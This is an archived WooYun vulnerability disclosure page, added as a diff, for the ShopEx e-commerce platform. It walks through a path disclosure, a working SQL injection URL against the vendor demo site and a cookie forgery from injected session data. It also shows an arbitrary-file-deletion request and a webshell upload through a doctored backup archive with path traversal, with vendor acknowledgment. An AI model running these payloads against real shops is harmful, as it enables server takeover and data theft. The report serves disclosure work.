@@ -1,0 +1,300 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		ShopEx一步一步拿shell  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		ShopEx一步一步拿shell  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/yy520">yy520</a> 
+</li><li>提交时间：		2012-08-23 00:58</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-08-23：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-08-23：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-08-26：	细节向第三方安全合作伙伴开放<br/>
+									2012-09-02：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-09-12：	细节向普通白帽子公开<br/>
+									2012-10-02：	细节向实习白帽子公开<br/>
+									2012-10-07：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">昨天刚从官网下载下来，应该是最新版的<br />
+整体没什么亮点，纯属刷rank<br />
+<br />
+PS：我擦~ 编辑了三次，能不能添加个保存功能~</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">0x1 爆路径<br />
+<br />
+http://demo.shopex.com.cn/485/index.php?gOo<br />
+<br />
+</p><p class="detail"><a href="../images/23003243a9bb03f57bba1ec68f568a59d410836f.png" target="_blank"><img src="../images/23003243a9bb03f57bba1ec68f568a59d410836f.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+额～ 这个表示对我无用<br />
+<br />
+<br />
+<br />
+0x2 注入<br />
+<br />
+http://demo.shopex.com.cn/485/?member-120120822173108&#039;/**/and/**/ExtractValue(0x64,concat(0x01,(select/**/@@version)))/**/order/**/by/**/&#039;1-orderdetail.html<br />
+<br />
+</p><p class="detail"><a href="../images/23003311f85833bd8e8deaa8f9377523dbc216fb.png" target="_blank"><img src="../images/23003311f85833bd8e8deaa8f9377523dbc216fb.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+得到一个注入点，一般接下来的步骤都是爆密码，解md5，可是我觉得我rp极差，一般都解不出，所以..第三步<br />
+<br />
+<br />
+<br />
+0x3 后台cookie设置<br />
+<br />
+登录成功之后会设置3个cookie<br />
+<br />
+</p><pre><code>setcookie(&#039;SHOPEX_LG_KEY&#039;,md5(remote_addr().$aResult[&#039;op_id&#039;]));<br />
+setcookie(&quot;SHOPEX_LOGIN_NAME&quot;,$_POST[&#039;usrname&#039;],(time()+86400*10));<br />
+setcookie( &quot;SHOPEX_SID&quot;, $this-&gt;sess_id );<br />
+<br />
+function remote_addr(){<br />
+    if(!isset($GLOBALS[&#039;_REMOTE_ADDR_&#039;])){<br />
+        $addrs = array();<br />
+<br />
+        if(isset($_SERVER[&#039;HTTP_X_FORWARDED_FOR&#039;])){<br />
+            foreach( array_reverse( explode( &#039;,&#039;,  $_SERVER[&#039;HTTP_X_FORWARDED_FOR&#039;] ) ) as $x_f )<br />
+            {<br />
+                $x_f = trim($x_f);<br />
+<br />
+                if ( preg_match( &#039;/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/&#039;, $x_f ) )<br />
+                {<br />
+                    $addrs[] = $x_f;<br />
+                }<br />
+            }<br />
+        }<br />
+<br />
+        $GLOBALS[&#039;_REMOTE_ADDR_&#039;] = isset($addrs[0])?$addrs[0]:$_SERVER[&#039;REMOTE_ADDR&#039;];<br />
+    }<br />
+    return $GLOBALS[&#039;_REMOTE_ADDR_&#039;];<br />
+}</code></pre><p class='detail'><br />
+<br />
+我们跑到XXX_op_sessions表 注射出sess_id,跑去XXX_operators表 注射出username和对应的op_id，构造cookie 登录上后台，本来想拿演示网做测试，结果我所在的网络有点奇葩，算了，本地测试成功。。。。<br />
+<br />
+<br />
+<br />
+0x4 后台任意文件删除<br />
+<br />
+终于进入后台了，先玩一下<br />
+<br />
+构造<br />
+<br />
+<br />
+<br />
+</p><pre><code>POST /shopex/shopadmin/index.php?ctl=system/comeback&amp;act=removeTgz&amp;_ajax=true&amp;_ss=setting,tools HTTP/1.1<br />
+Host: 10.1.1.100<br />
+Proxy-Connection: keep-alive<br />
+Content-Length: 38<br />
+Origin: http://10.1.1.100<br />
+X-Requested-With: XMLHttpRequest<br />
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.79 Safari/537.1<br />
+Content-type: application/x-www-form-urlencoded; charset=UTF-8<br />
+Accept: text/javascript, text/html, application/xml, text/xml, */*<br />
+Referer: http://10.1.1.100/shopex/shopadmin/index.php<br />
+Accept-Encoding: gzip,deflate,sdch<br />
+Accept-Language: zh-CN,zh;q=0.8<br />
+Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3<br />
+Cookie: *********************<br />
+<br />
+tgz[]=multibak_20120822202808.tgz&amp;__=1</code></pre><p class='detail'><br />
+<br />
+把tgz[]换成想删除的文件的相对路径,极其鸡肋，对我来说也是无用<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+0x5 后台拿shell<br />
+<br />
+本来还是想拿官网演示站 做演示的 结果 相应的功能被禁用了，rp如此之差 完全可以体现出来了<br />
+<br />
+本地测试～～～<br />
+<br />
+先备份个，然后直接下载备份文件，修改压缩文件里面的文件名以及文件内容<br />
+<br />
+</p><p class="detail"><a href="../images/22233741ce866113c7133027f2df02d399d44384.png" target="_blank"><img src="../images/22233741ce866113c7133027f2df02d399d44384.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+最后将压缩文件的后缀修改为jpg 后台直接传图片 获取图片地址<br />
+<br />
+<br />
+<br />
+在数据恢复处 恢复数据 截包修改<br />
+<br />
+<br />
+<br />
+</p><pre><code>GET /shopex/shopadmin/index.php?ctl=system/comeback&amp;act=comeback&amp;p[0]=multibak_20120822202808.tgz&amp;p[1]=1345638490&amp;p[2]=2&amp;_ajax=true&amp;_ss=setting,tools HTTP/1.1<br />
+Host: 10.1.1.100<br />
+Proxy-Connection: keep-alive<br />
+X-Requested-With: XMLHttpRequest<br />
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.79 Safari/537.1<br />
+Accept: text/javascript, text/html, application/xml, text/xml, */*<br />
+Referer: http://10.1.1.100/shopex/shopadmin/index.php<br />
+Accept-Encoding: gzip,deflate,sdch<br />
+Accept-Language: zh-CN,zh;q=0.8<br />
+Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3<br />
+Cookie: ******************</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+将p[0]修改为之前上传图片的地址 如：/../../images/default/default_preview_pic.jpg<br />
+<br />
+在拦截到最后一个包的时候不给予通过～ 如果通过之后会把之前的临时文件给删除<br />
+<br />
+<br />
+<br />
+最后shell路径：<br />
+<br />
+/home/tmp/md5(&#039;/../../images/default/default_preview_pic.jpg&#039;)/yy520.php.sql<br />
+<br />
+<br />
+<br />
+基本原理和 <br />
+<br />
+http://wooyun.org/bugs/wooyun-2012-010431 差不多~ 所以就少截一点图了。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">前面好像证明过了~~ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">其实我也不太懂 ：） </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/yy520" title="yy520">yy520</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-011194" title="ShopEx一步一步拿shell">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2012-08-23 11:56</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢您为shopex安全做的贡献<br />
+我们会尽快处理<br />
+非常感谢</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="11194";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
